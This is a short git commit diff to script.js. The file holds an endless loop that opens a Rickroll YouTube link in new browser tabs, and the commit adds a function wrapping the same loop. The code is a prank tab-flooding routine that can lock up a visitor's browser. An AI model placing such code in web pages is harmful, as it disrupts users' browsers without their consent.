8e0757df5e06e4ff81037bd11881d88cf664a9d4
meepooh <66320961+scratchusernamemrtbts@users.noreply.github.com>
2022-05-24 09:56:37 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,8 @@
 while (true) {
     window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ",'_blank');
 }
+function yes() {
+while (true) {
+    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ",'_blank');
+}
+}
